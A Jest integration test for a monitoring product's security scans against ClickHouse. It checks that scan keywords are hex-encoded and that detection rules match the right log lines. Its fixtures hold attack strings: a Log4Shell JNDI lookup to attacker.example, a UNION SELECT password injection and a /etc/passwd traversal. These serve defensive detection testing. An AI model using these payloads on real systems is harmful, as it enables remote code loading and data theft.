import Log from "Common/Models/AnalyticsModels/Log";
import SecurityEvent from "Common/Models/AnalyticsModels/SecurityEvent";
import { ClickHouseClientConfigOptions } from "Common/Server/Infrastructure/ClickhouseConfig";
import ClickhouseDatabase, {
  ClickhouseClient,
} from "Common/Server/Infrastructure/ClickhouseDatabase";
import { TelemetryServiceMetadata } from "Common/Server/Services/OpenTelemetryIngestService";
import {
  SQL,
  Statement,
  StatementParameter,
} from "Common/Server/Utils/AnalyticsDatabase/Statement";
import StatementGenerator from "Common/Server/Utils/AnalyticsDatabase/StatementGenerator";
import { buildSecurityEventDbRow } from "Common/Server/Utils/SecurityEvent/SecurityEventRow";
import TableColumnType from "Common/Types/AnalyticsDatabase/TableColumnType";
import OneUptimeDate from "Common/Types/Date";
import { JSONObject } from "Common/Types/JSON";
import ObjectID from "Common/Types/ObjectID";
import { DETECTION_RULE_LIBRARY } from "Common/Types/SecurityEvent/DetectionRuleLibrary";
import NormalizedSecurityEvent from "Common/Types/SecurityEvent/NormalizedSecurityEvent";
import OcsfSeverity from "Common/Types/SecurityEvent/OcsfSeverity";
import ServiceType from "Common/Types/Telemetry/ServiceType";
import SecurityLogParser, {
  matchesSecurityLogPrefilter,
} from "Common/Utils/SecurityEvent/LogParsers/SecurityLogParser";
import { SECURITY_SCAN_WORDS } from "Common/Utils/SecurityEvent/SecurityScanWords";
import SigmaRuleSetParser, {
  sigmaRulesOf,
} from "Common/Utils/SecurityEvent/Sigma/SigmaRuleSetParser";
import {
  afterAll,
  afterEach,
  beforeAll,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";

/*
 * ------------------------------------------------------------------
 * The security scans' queries against a real ClickHouse server (#6419).
 *
 * The scans send the words they look for hex encoded - unhex({p0:String}),
 * [unhex({p1_0:String}), ...] - so that ClickHouse's own records of a
 * query never hold them: a failed query's error line ("(in query: ...)")
 * was shipped back as a log and read as a Log4Shell attempt from
 * ClickHouse's version. Common's suites pin the statements; this one
 * shows what ClickHouse makes of them, with both analyzers:
 *
 *   - the log scan's read returns exactly the lines the prefilter, read in
 *     JavaScript, says it should;
 *   - each operator a statement uses on hex encoded text reads what it did
 *     on the text as written;
 *   - the Log4Shell rule of the library finds the event it should;
 *   - a scan query that fails leaves no scan word in system.query_log or
 *     system.text_log, while the same query sent as written does.
 *
 * Opt in locally by pointing TEST_CLICKHOUSE_URL at a disposable server:
 *
 *   docker run -d --rm -p 18125:8123 -e CLICKHOUSE_PASSWORD=test \
 *     clickhouse/clickhouse-server:26.7
 *   TEST_CLICKHOUSE_URL=http://default:test@localhost:18125 \
 *     npx jest Tests/Telemetry/SecurityScanQueriesClickhouse.test.ts
 *
 * The App Test workflow provides the server; the guard at the bottom fails
 * the run there if it ever goes missing.
 * ------------------------------------------------------------------
 */

jest.mock("Common/Server/Utils/Logger", () => {
  return {
    __esModule: true,
    default: {
      debug: jest.fn(),
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
    },
  };
});

import LogService from "Common/Server/Services/LogService";
import SecurityEventService from "Common/Server/Services/SecurityEventService";
import SigmaClickhouseCompiler from "Common/Server/Utils/SecurityEvent/Sigma/SigmaClickhouseCompiler";

const endpoint: string | undefined = process.env["TEST_CLICKHOUSE_URL"];

jest.setTimeout(120000);

const integration: typeof describe.skip = endpoint ? describe : describe.skip;

const database: string = `security_scan_queries_test_${process.pid}_${Date.now()}`;

const projectId: ObjectID = new ObjectID(
  "64190000-0000-4000-8000-00000000000a",
);
const otherProjectId: ObjectID = new ObjectID(
  "64190000-0000-4000-8000-00000000000b",
);

const NOW: Date = new Date();
const ARRIVED_AFTER: Date = new Date(NOW.getTime() - 10 * 60 * 1000);
const ARRIVED_UNTIL: Date = new Date(NOW.getTime() + 10 * 60 * 1000);
const HAPPENED_AFTER: Date = new Date(NOW.getTime() - 24 * 60 * 60 * 1000);

const LOG4SHELL_RULE_ID: string = "866b7566-304e-442b-b1ad-ca08264af493";

// Lines the scan reads, and lines it leaves alone, by the id each is stored under.
const BODIES: Record<string, string> = {
  sshFailed:
    "Oct 19 10:00:01 web-03 sshd[2210]: Failed password for invalid user admin from 203.0.113.7 port 52314 ssh2",
  sshAccepted:
    "Oct 19 10:00:02 web-03 sshd[2211]: Accepted publickey for deploy from 203.0.113.8 port 52315 ssh2",
  sudo: "Oct 19 10:00:03 web-03 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash",
  log4Shell:
    "WARN rejected header X-Api-Version=${jndi:ldap://attacker.example/x} from 203.0.113.44 on /api/v1/orders",
  log4ShellEncoded:
    '203.0.113.45 - - [08/Nov/2026:09:10:00 +0000] "GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D HTTP/1.1" 404 0 "-" "curl/8.5.0"',
  sqlInjection:
    '203.0.113.46 - - [08/Nov/2026:09:10:00 +0000] "GET /item?id=1 UNION SELECT password FROM users HTTP/1.1" 200 12 "-" "sqlmap/1.8"',
  pathTraversal:
    '203.0.113.47 - - [08/Nov/2026:09:10:00 +0000] "GET /static/../../etc/passwd HTTP/1.1" 404 0 "-" "curl/8.5.0"',
  cefBlocked:
    "CEF:0|Vendor|Firewall|1.0|100|Connection blocked|10|src=203.0.113.48 dst=10.0.0.5",
  kubernetesForbidden:
    '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"get","objectRef":{"resource":"secrets"},"user":{"username":"mallory"},"responseStatus":{"code":403}}',
  kubernetesPrivilegedByNode:
    '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","objectRef":{"resource":"pods"},"user":{"username":"system:node:n1"},"requestObject":{"spec":{"hostPID":true}}}',
  cloudTrailError:
    '{"eventSource":"iam.amazonaws.com","eventName":"CreateUser","errorCode":"AccessDenied","userIdentity":{"type":"IAMUser"}}',
  // The line of issue #6419 itself, words and all: the prefilter reads it, the parsers do not.
  oldEcho:
    "2026.11.08 09:12:44.512345 [ 812 ] {7f3c2a10} <Error> executeQuery: Code: 241. (MEMORY_LIMIT_EXCEEDED) (version 26.7.38.18 (official build)) (from [::ffff:10.42.0.17]:44220) (in query: SELECT _id FROM LogItemV3 WHERE multiSearchAnyCaseInsensitive(body, _CAST(['${jndi:', '%24%7bjndi'], 'Array(String)')))",
  // Lines that hold no word the scan looks for.
  ordinary: "GET /items?page=2 200 12ms",
  loggedOut: "user alice logged out",
  kubernetesByNode:
    '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"update","objectRef":{"resource":"pods"},"user":{"username":"system:node:n1"},"responseStatus":{"code":200}}',
  cloudTrailRead:
    '{"eventSource":"s3.amazonaws.com","eventName":"GetObject","readOnly":true,"userIdentity":{"type":"IAMUser"}}',
  namedOnly: "searching the logs for the Log4Shell string",
};

const SERVICE_METADATA: TelemetryServiceMetadata = {
  serviceName: "Scan fixtures",
  primaryEntityId: new ObjectID("64190000-0000-4000-8000-00000000000c"),
  primaryEntityType: ServiceType.OpenTelemetry,
  dataRententionInDays: 15,
  serviceRetentionConfig: null,
  serviceRetentionInDays: null,
  projectRetentionConfig: null,
  projectRetentionInDays: 15,
};

function securityEvent(data: {
  uid: string;
  targetResource: string;
  project?: ObjectID;
}): JSONObject {
  const normalized: NormalizedSecurityEvent = {
    time: new Date(NOW.getTime() - 60 * 1000),
    eventUid: data.uid,
    categoryUid: 4,
    categoryName: "Network Activity",
    classUid: 4002,
    className: "HTTP Activity",
    activityName: "GET",
    severityId: 4,
    severityName: OcsfSeverity.High,
    statusName: "Failure",
    message: `request ${data.uid}`,
    vendorName: "Fixture",
    productName: "Fixture",
    ruleId: "",
    ruleName: "",
    mitreTactics: [],
    mitreTechniques: [],
    principalUser: "",
    principalHost: "",
    principalIp: "203.0.113.44",
    principalProcess: "",
    processName: "",
    processPath: "",
    processCommandLine: "",
    parentProcessName: "",
    parentProcessPath: "",
    parentProcessCommandLine: "",
    targetUser: "",
    targetHost: "",
    targetIp: "",
    targetPort: 0,
    targetResource: data.targetResource,
    observables: [],
    attributes: {},
  };

  return buildSecurityEventDbRow({
    normalized,
    projectId: data.project || projectId,
    serviceMetadata: SERVICE_METADATA,
    retentionDays: 15,
  });
}

function wordsIn(text: string): Array<string> {
  const lower: string = text.toLowerCase();

  return SECURITY_SCAN_WORDS.filter((word: string): boolean => {
    return lower.includes(word);
  });
}

integration("The security scans' queries against ClickHouse", () => {
  let clickhouse: ClickhouseDatabase;
  let client: ClickhouseClient;
  let originalLog: Partial<typeof LogService> | undefined;
  let originalSecurityEvent: Partial<typeof SecurityEventService> | undefined;
  let textLogPresent: boolean = false;

  // A query's rows, with settings of its own.
  async function rowsOf(
    statement: Statement,
    settings: JSONObject = {},
    queryId?: string,
  ): Promise<Array<JSONObject>> {
    const result: { json: () => Promise<unknown> } = await client.query({
      query: statement.query,
      query_params: statement.query_params,
      format: "JSONEachRow",
      clickhouse_settings: settings as never,
      ...(queryId ? { query_id: queryId } : {}),
    });

    return (await result.json()) as Array<JSONObject>;
  }

  // The log scan's own read, as it sends it.
  async function captureLogScanRead(): Promise<Statement> {
    const spy: ReturnType<typeof jest.spyOn> = jest.spyOn(
      LogService,
      "executeQuery",
    );

    await LogService.findSecurityLogCandidates({
      projectId: projectId,
      arrivedAfter: ARRIVED_AFTER,
      arrivedUntil: ARRIVED_UNTIL,
      happenedAfter: HAPPENED_AFTER,
      limit: 1000,
      offset: 0,
    });

    const statement: Statement = spy.mock.calls[0]![0] as Statement;
    spy.mockRestore();

    return statement;
  }

  // What ClickHouse wrote down about one query: query_log, and text_log when the server keeps it.
  async function recordsOf(queryId: string): Promise<Array<string>> {
    await client.command({ query: "SYSTEM FLUSH LOGS" });

    const records: Array<string> = [];
    const queryLog: Array<JSONObject> = await rowsOf(
      SQL`SELECT type, query, exception FROM system.query_log WHERE query_id = ${{
        type: TableColumnType.Text,
        value: queryId,
      }}`,
    );

    for (const row of queryLog) {
      records.push(String(row["query"]), String(row["exception"]));
    }

    if (textLogPresent) {
      const textLog: Array<JSONObject> = await rowsOf(
        SQL`SELECT message FROM system.text_log WHERE query_id = ${{
          type: TableColumnType.Text,
          value: queryId,
        }}`,
      );

      for (const row of textLog) {
        records.push(String(row["message"]));
      }
    }

    return records;
  }

  beforeAll(async (): Promise<void> => {
    const url: URL = new URL(endpoint!);

    if (!["localhost", "127.0.0.1", "[::1]"].includes(url.hostname)) {
      throw new Error(
        "TEST_CLICKHOUSE_URL must point at a local, disposable ClickHouse server.",
      );
    }

    const options: ClickHouseClientConfigOptions = {
      url: `${url.protocol}//${url.host}`,
      username: decodeURIComponent(url.username) || "default",
      password: decodeURIComponent(url.password),
      database: database,
      request_timeout: 60000,
    };

    clickhouse = new ClickhouseDatabase(options);
    client = await clickhouse.connect(options);

    const tables: Array<{ model: Log | SecurityEvent; columns: Statement }> = [
      {
        model: new Log(),
        columns: new StatementGenerator<Log>({
          modelType: Log,
          database: clickhouse,
        }).toColumnsCreateStatement(new Log().tableColumns),
      },
      {
        model: new SecurityEvent(),
        columns: new StatementGenerator<SecurityEvent>({
          modelType: SecurityEvent,
          database: clickhouse,
        }).toColumnsCreateStatement(new SecurityEvent().tableColumns),
      },
    ];

    for (const { model, columns } of tables) {
      await client.command({
        query: `CREATE TABLE ${database}.${model.tableName} (${columns.query}) ENGINE = MergeTree PARTITION BY (${model.partitionKey}) PRIMARY KEY (${model.primaryKeys.join(", ")}) ORDER BY (${model.sortKeys.join(", ")})`,
        query_params: columns.query_params,
      });
    }

    originalLog = {
      database: LogService.database,
      databaseClient: LogService.databaseClient,
      ingestDatabase: LogService.ingestDatabase,
      ingestDatabaseClient: LogService.ingestDatabaseClient,
    } as Partial<typeof LogService>;
    LogService.database = clickhouse;
    LogService.databaseClient = client;
    LogService.ingestDatabase = clickhouse;
    LogService.ingestDatabaseClient = client;

    originalSecurityEvent = {
      database: SecurityEventService.database,
      databaseClient: SecurityEventService.databaseClient,
      ingestDatabase: SecurityEventService.ingestDatabase,
      ingestDatabaseClient: SecurityEventService.ingestDatabaseClient,
    } as Partial<typeof SecurityEventService>;
    SecurityEventService.database = clickhouse;
    SecurityEventService.databaseClient = client;
    SecurityEventService.ingestDatabase = clickhouse;
    SecurityEventService.ingestDatabaseClient = client;

    const time: string = OneUptimeDate.toClickhouseDateTime(
      new Date(NOW.getTime() - 60 * 1000),
    );
    const createdAt: string = OneUptimeDate.toClickhouseDateTime(NOW);
    const retention: string = OneUptimeDate.toClickhouseDateTime(
      OneUptimeDate.addRemoveDays(NOW, 30),
    );
    const logRows: Array<JSONObject> = [];

    for (const [id, body] of Object.entries(BODIES)) {
      for (const project of [projectId, otherProjectId]) {
        logRows.push({
          _id: project === projectId ? id : `other-${id}`,
          projectId: project.toString(),
          primaryEntityId: SERVICE_METADATA.primaryEntityId.toString(),
          primaryEntityType: "Service",
          time: time,
          timeUnixNano: `${NOW.getTime() - 60 * 1000}000000`,
          severityText: "Information",
          severityNumber: 9,
          attributes: {},
          attributeKeys: [],
          body: body,
          retentionDate: retention,
          createdAt: createdAt,
        });
      }
    }

    await client.insert({
      table: `${database}.${new Log().tableName}`,
      values: logRows,
      format: "JSONEachRow",
    });

    await SecurityEventService.insertJsonRows(
      [
        securityEvent({
          uid: "lookup",
          targetResource: "/?x=${jndi:ldap://attacker.example/a}",
        }),
        securityEvent({
          uid: "encoded-lookup",
          targetResource:
            "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D",
        }),
        securityEvent({ uid: "ordinary", targetResource: "/items?page=2" }),
        securityEvent({
          uid: "other-project",
          targetResource: "/?x=${jndi:ldap://attacker.example/a}",
          project: otherProjectId,
        }),
      ],
      { clickhouseSettings: { wait_for_async_insert: 1 } },
    );

    const textLog: Array<JSONObject> = await rowsOf(
      SQL`SELECT count() AS present FROM system.tables WHERE database = 'system' AND name = 'text_log'`,
    );
    textLogPresent = Number(textLog[0]?.["present"]) > 0;
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  afterAll(async (): Promise<void> => {
    if (originalLog) {
      Object.assign(LogService, originalLog);
    }

    if (originalSecurityEvent) {
      Object.assign(SecurityEventService, originalSecurityEvent);
    }

    if (client) {
      await client.command({ query: `DROP DATABASE IF EXISTS ${database}` });
    }

    if (clickhouse) {
      await clickhouse.disconnect();
    }
  });

  describe.each([
    ["the new analyzer", { enable_analyzer: 1 }],
    ["the old analyzer", { enable_analyzer: 0 }],
  ])("with %s", (_name: string, settings: JSONObject) => {
    test("the log scan reads exactly the lines the prefilter says, words in hex", async () => {
      const statement: Statement = await captureLogScanRead();

      expect(statement.query).toContain(
        "multiSearchAnyCaseInsensitive(body, [unhex({p",
      );
      expect(wordsIn(statement.query)).toEqual([]);

      const rows: Array<JSONObject> = await rowsOf(statement, settings);
      const read: Array<string> = rows
        .map((row: JSONObject): string => {
          return String(row["_id"]);
        })
        .sort();
      const expected: Array<string> = Object.entries(BODIES)
        .filter(([, body]: [string, string]): boolean => {
          return matchesSecurityLogPrefilter(body);
        })
        .map(([id]: [string, string]): string => {
          return id;
        })
        .sort();

      expect(read).toEqual(expected);
      expect(expected).toEqual(
        expect.arrayContaining([
          "sshFailed",
          "log4Shell",
          "log4ShellEncoded",
          "sqlInjection",
          "cefBlocked",
          "kubernetesForbidden",
          "kubernetesPrivilegedByNode",
          "cloudTrailError",
        ]),
      );
      expect(expected).not.toContain("ordinary");
      expect(expected).not.toContain("kubernetesByNode");
      expect(expected).not.toContain("cloudTrailRead");
    });

    test("every operator reads hex encoded text as it read the text as written", async () => {
      const table: string = `${database}.${new Log().tableName}`;
      const text: (value: string) => StatementParameter = (
        value: string,
      ): StatementParameter => {
        return { type: TableColumnType.Text, value };
      };
      const texts: (value: Array<string>) => StatementParameter = (
        value: Array<string>,
      ): StatementParameter => {
        return { type: TableColumnType.ArrayText, value };
      };
      const where: (condition: Statement) => Statement = (
        condition: Statement,
      ): Statement => {
        const statement: Statement = SQL`SELECT _id FROM `;
        statement.append(table);
        statement.append(
          SQL` WHERE projectId = ${{
            type: TableColumnType.ObjectID,
            value: projectId,
          }} AND `,
        );
        statement.append(condition);
        statement.append(" ORDER BY _id");

        return statement;
      };

      const cases: Array<{
        name: string;
        condition: Statement;
        ids: Array<string>;
      }> = [
        {
          name: "equals",
          condition: SQL`body = ${text(BODIES["log4Shell"]!)}`,
          ids: ["log4Shell"],
        },
        {
          name: "not equals",
          condition: SQL`body != ${text(BODIES["log4Shell"]!)} AND _id IN ('log4Shell', 'sqlInjection')`,
          ids: ["sqlInjection"],
        },
        {
          name: "in",
          condition: SQL`body IN ${texts([BODIES["log4Shell"]!, BODIES["pathTraversal"]!])}`,
          ids: ["log4Shell", "pathTraversal"],
        },
        {
          name: "not in",
          condition: SQL`body NOT IN ${texts([BODIES["log4Shell"]!, BODIES["pathTraversal"]!])} AND _id IN ('log4Shell', 'sqlInjection', 'pathTraversal')`,
          ids: ["sqlInjection"],
        },
        {
          name: "has",
          condition: SQL`has(${texts([BODIES["sqlInjection"]!, "union select"])}, body)`,
          ids: ["sqlInjection"],
        },
        {
          name: "a search of many words",
          condition: SQL`multiSearchAnyCaseInsensitive(body, ${texts(["${jndi:ldap", "../../etc"])})`,
          ids: ["log4Shell", "pathTraversal"],
        },
        {
          name: "a search of one word",
          condition: SQL`positionCaseInsensitive(body, ${text("UNION SELECT")}) > 0`,
          ids: ["sqlInjection"],
        },
        {
          name: "a like pattern",
          condition: SQL`body LIKE ${text("%${jndi:ldap://%")}`,
          ids: ["log4Shell"],
        },
        {
          name: "a case-insensitive like pattern",
          condition: SQL`body ILIKE ${text("%failed PASSWORD for%")}`,
          ids: ["sshFailed"],
        },
        {
          name: "not like",
          condition: SQL`body NOT ILIKE ${text("%union select%")} AND _id IN ('sqlInjection', 'ordinary')`,
          ids: ["ordinary"],
        },
      ];

      for (const item of cases) {
        const statement: Statement = where(item.condition);

        expect({ name: item.name, words: wordsIn(statement.query) }).toEqual({
          name: item.name,
          words: [],
        });

        const ids: Array<string> = (await rowsOf(statement, settings)).map(
          (row: JSONObject): string => {
            return String(row["_id"]);
          },
        );

        expect({ name: item.name, ids }).toEqual({
          name: item.name,
          ids: [...item.ids].sort(),
        });
      }
    });

    test("the library's Log4Shell rule finds the lookups, and nothing else", async () => {
      const entry: { sigmaRuleYaml: string } | undefined =
        DETECTION_RULE_LIBRARY.find((rule: { id: string }): boolean => {
          return rule.id === LOG4SHELL_RULE_ID;
        });
      const [rule] = sigmaRulesOf(
        SigmaRuleSetParser.parse(entry!.sigmaRuleYaml),
      );
      const statement: Statement = SQL`SELECT eventUid FROM `;

      statement.append(`${database}.${new SecurityEvent().tableName}`);
      statement.append(
        SQL` WHERE projectId = ${{
          type: TableColumnType.ObjectID,
          value: projectId,
        }} AND (`,
      );
      statement.append(SigmaClickhouseCompiler.compile(rule!));
      statement.append(") ORDER BY eventUid");

      expect(wordsIn(statement.query)).toEqual([]);

      const uids: Array<string> = (await rowsOf(statement, settings)).map(
        (row: JSONObject): string => {
          return String(row["eventUid"]);
        },
      );

      // The rule reads the raw string: the encoded lookup is no match, as it never was.
      expect(uids).toEqual(["lookup"]);
    });

    test("a scan query that fails leaves no scan word in what ClickHouse writes down", async () => {
      const statement: Statement = await captureLogScanRead();
      const queryId: string = `scan-6419-hex-${process.pid}-${Date.now()}-${String(settings["enable_analyzer"])}`;

      await expect(
        rowsOf(
          statement,
          { ...settings, max_rows_to_read: 1, read_overflow_mode: "throw" },
          queryId,
        ),
      ).rejects.toThrow(/TOO_MANY_ROWS|Limit for rows/);

      const records: Array<string> = await recordsOf(queryId);

      expect(records.length).toBeGreaterThan(0);
      expect(records.join("\n")).toContain("unhex(");

      for (const record of records) {
        expect({
          record: record.slice(0, 300),
          words: wordsIn(record),
        }).toEqual({
          record: record.slice(0, 300),
          words: [],
        });
      }

      // The error line the server writes for it, read back as a log line: nothing.
      for (const record of records) {
        expect(
          SecurityLogParser.parse({
            body: record,
            attributes: {},
            time: new Date(),
            logId: "0192f1a0-0000-7000-8000-000000006419",
          }),
        ).toEqual([]);
      }
    });

    test("control: the same failure with the words as written writes them down", async () => {
      const queryId: string = `scan-6419-plain-${process.pid}-${Date.now()}-${String(settings["enable_analyzer"])}`;

      await expect(
        client.query({
          query: `SELECT _id FROM ${database}.${new Log().tableName} WHERE multiSearchAnyCaseInsensitive(body, {p0:Array(String)})`,
          query_params: { p0: ["${jndi:", "%24%7bjndi", "union select"] },
          query_id: queryId,
          format: "JSONEachRow",
          clickhouse_settings: {
            ...settings,
            max_rows_to_read: "1",
            read_overflow_mode: "throw",
          } as never,
        }),
      ).rejects.toThrow(/TOO_MANY_ROWS|Limit for rows/);

      const records: Array<string> = await recordsOf(queryId);

      expect(wordsIn(records.join("\n"))).toEqual(
        expect.arrayContaining(["${jndi:", "%24%7bjndi", "union select"]),
      );
    });
  });
});

describe("Security scan queries ClickHouse suite wiring", () => {
  test("runs whenever the suite is under CI", () => {
    if (process.env["GITHUB_ACTIONS"] === "true") {
      expect(endpoint).toBeTruthy();
    }
  });
});
